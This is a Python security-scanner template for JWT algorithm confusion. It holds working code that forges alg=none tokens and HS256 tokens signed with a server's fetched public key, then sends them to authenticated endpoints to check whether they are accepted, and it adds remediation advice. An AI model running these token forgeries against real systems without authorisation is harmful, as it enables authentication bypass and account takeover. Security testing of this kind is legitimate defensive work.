#!/usr/bin/env python3
#
# @id: jwt-alg-confusion
# @name: JWT Algorithm Confusion (RS256 → HS256 / none)
# @author: BugB Security Team
# @severity: critical
# @description: Tests for JWT algorithm confusion attacks — forging tokens by switching RS256 to HS256 (using the public key as HMAC secret) and the none-algorithm bypass. Requires a valid bearer token from pipeline context.
# @tags: jwt,algorithm-confusion,authentication,owasp-a02,token-forgery,none-alg
# @cwe: CWE-327
# @cvss: 9.1
# @confidence: 85
# @version: 1.0.0
# @references: https://portswigger.net/web-security/jwt/algorithm-confusion,https://cwe.mitre.org/data/definitions/327.html,https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/
# @context_vars: bearer_token:required, endpoints[]:optional
# @vuln_class: jwt_abuse
# @hypothesis_tags: jwt, algorithm-confusion, token-forgery, rs256-to-hs256, none-algorithm, broken-authentication
# @batch_group: auth-context
# @auto_probe: false
#

import base64
import hashlib
import hmac
import json
import os
import re
import sys
import requests
import urllib3
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEMPLATE_ID   = "jwt-alg-confusion"
TEMPLATE_NAME = "JWT Algorithm Confusion (RS256 → HS256 / none)"

# ── Context helpers ────────────────────────────────────────────────────────────

def get_target() -> Tuple[Optional[str], int]:
    host = os.environ.get("CERT_X_GEN_TARGET_HOST")
    port = int(os.environ.get("CERT_X_GEN_TARGET_PORT", "80"))
    return host, port

def get_context() -> Dict[str, Any]:
    raw = os.environ.get("CERT_X_GEN_CONTEXT", "{}")
    try:
        return json.loads(raw)
    except Exception:
        return {}

def build_base_url(host: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"

def missing_context_finding(host: str, missing: List[str]) -> Dict[str, Any]:
    return {
        "template_id": TEMPLATE_ID,
        "template_name": TEMPLATE_NAME,
        "host": host,
        "matched_at": host,
        "severity": "info",
        "confidence": 100,
        "title": f"Template requires context: {', '.join(missing)} missing",
        "description": (
            f"{TEMPLATE_NAME} needs a valid JWT from the authenticated session. "
            f"Missing: {', '.join(missing)}. "
            "Re-run with: --context '{\"bearer_token\":\"eyJ...\"}'"
        ),
        "evidence": {"missing_vars": missing},
        "cwe": "CWE-327",
        "cvss_score": 0.0,
        "remediation": "Provide bearer_token via --context flag.",
        "references": [],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

# ── JWT helpers ───────────────────────────────────────────────────────────────

def b64_url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    return base64.b64decode(s + "=" * (4 - len(s) % 4))

def b64_url_encode(b: bytes) -> str:
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "_").rstrip("=")

def parse_jwt(token: str) -> Optional[Tuple[Dict, Dict, str]]:
    """Return (header, payload, original_signature_b64) or None."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header  = json.loads(b64_url_decode(parts[0]))
        payload = json.loads(b64_url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None

def forge_none_token(header: Dict, payload: Dict) -> str:
    """Forge a token with alg=none and empty signature."""
    forged_header = dict(header)
    forged_header["alg"] = "none"
    h = b64_url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    p = b64_url_encode(json.dumps(payload,       separators=(",", ":")).encode())
    return f"{h}.{p}."

def forge_hs256_with_pubkey(header: Dict, payload: Dict, pubkey_pem: str) -> Optional[str]:
    """Forge HS256 token using the server's RS256 public key as the HMAC secret."""
    try:
        forged_header = dict(header)
        forged_header["alg"] = "HS256"
        h = b64_url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
        p = b64_url_encode(json.dumps(payload,       separators=(",", ":")).encode())
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(pubkey_pem.encode(), signing_input, hashlib.sha256).digest()
        return f"{h}.{p}.{b64_url_encode(sig)}"
    except Exception:
        return None

def try_fetch_public_key(base_url: str) -> Optional[str]:
    """Probe well-known locations for an RS256 public key PEM."""
    probes = [
        "/.well-known/jwks.json",
        "/oauth/jwks.json",
        "/api/jwks.json",
        "/.well-known/openid-configuration",
    ]
    session = requests.Session()
    session.verify = False
    for path in probes:
        try:
            resp = session.get(base_url + path, timeout=6)
            if resp.status_code == 200 and "keys" in resp.text:
                # Return raw JSON text as the "secret" for HS256 confusion
                return resp.text.strip()
        except Exception:
            pass
    return None

# ── Test probes ───────────────────────────────────────────────────────────────

SESSION = requests.Session()
SESSION.verify = False

def probe_authenticated_endpoint(
    base_url: str,
    endpoints: List[str],
    auth_headers: Dict[str, str],
) -> Optional[Tuple[str, int]]:
    """Find an endpoint that returns 200 with the real token."""
    candidates = list(endpoints) if endpoints else []
    candidates += ["/api/me", "/rest/user/whoami", "/api/v1/me", "/api/user"]
    for ep in candidates:
        url = ep if ep.startswith("http") else base_url + ep
        try:
            r = SESSION.get(url, headers=auth_headers, timeout=7)
            if r.status_code == 200:
                return url, 200
        except Exception:
            pass
    return None

def test_forged_token(
    url: str,
    forged_token: str,
    original_status: int,
    host: str,
    attack_name: str,
    details: str,
) -> Optional[Dict[str, Any]]:
    """Send forged token; finding if server still returns 200."""
    try:
        headers = {
            "Authorization": f"Bearer {forged_token}",
            "User-Agent": "CXG-JWT-Scanner/1.0",
            "Accept": "application/json",
        }
        r = SESSION.get(url, headers=headers, timeout=7)
        if r.status_code == 200:
            return {
                "template_id": TEMPLATE_ID,
                "template_name": TEMPLATE_NAME,
                "host": host,
                "matched_at": url,
                "severity": "critical",
                "confidence": 90,
                "title": f"JWT Algorithm Confusion: {attack_name}",
                "description": (
                    f"The server accepted a forged JWT at {url}. "
                    f"Attack: {details}. "
                    "An attacker can forge arbitrary tokens granting access to any account."
                ),
                "evidence": {
                    "attack": attack_name,
                    "forged_token_prefix": forged_token[:60] + "…",
                    "response_status": r.status_code,
                    "response_preview": r.text[:200],
                },
                "cwe": "CWE-327",
                "cvss_score": 9.1,
                "remediation": (
                    "Explicitly whitelist allowed algorithms server-side. Never accept 'none'. "
                    "Use a separate secret for HS256 — never reuse RS256 public keys. "
                    "Validate the 'alg' header against a server-controlled allowlist before "
                    "signature verification."
                ),
                "references": [
                    "https://portswigger.net/web-security/jwt/algorithm-confusion",
                    "https://cwe.mitre.org/data/definitions/327.html",
                    "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                ],
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
    except Exception:
        pass
    return None

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    host, port = get_target()
    if not host:
        print(json.dumps({"findings": []}))
        return

    ctx = get_context()
    base_url = build_base_url(host, port)

    # Tier 1: require bearer_token
    bearer = ctx.get("bearer_token") or ctx.get("auth_token", "")
    if bearer.lower().startswith("bearer "):
        bearer = bearer[7:]

    if not bearer:
        print(json.dumps({"findings": [missing_context_finding(host, ["bearer_token"])]}))
        return

    parsed = parse_jwt(bearer)
    if not parsed:
        print(json.dumps({"findings": []}))
        return

    original_header, original_payload, _ = parsed
    alg = original_header.get("alg", "")

    auth_headers = {
        "Authorization": f"Bearer {bearer}",
        "User-Agent": "CXG-JWT-Scanner/1.0",
        "Accept": "application/json",
    }

    endpoints = ctx.get("endpoints", [])

    # Find a live endpoint we can use as oracle
    oracle = probe_authenticated_endpoint(base_url, endpoints, auth_headers)
    if not oracle:
        print(json.dumps({"findings": []}))
        return
    oracle_url, _ = oracle

    findings = []

    # Attack 1: alg=none
    none_token = forge_none_token(original_header, original_payload)
    f = test_forged_token(
        oracle_url, none_token, 200, host,
        "alg=none bypass",
        "Algorithm set to 'none'; signature stripped entirely",
    )
    if f:
        findings.append(f)

    # Attack 2: RS256 → HS256 using public key as secret (only if original alg was asymmetric)
    if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
        pubkey = try_fetch_public_key(base_url)
        if pubkey:
            hs_token = forge_hs256_with_pubkey(original_header, original_payload, pubkey)
            if hs_token:
                f = test_forged_token(
                    oracle_url, hs_token, 200, host,
                    "RS256→HS256 confusion",
                    f"Re-signed with HS256 using server public key as HMAC secret (fetched from well-known endpoint)",
                )
                if f:
                    findings.append(f)

    print(json.dumps({"findings": findings}))

if __name__ == "__main__":
    main()
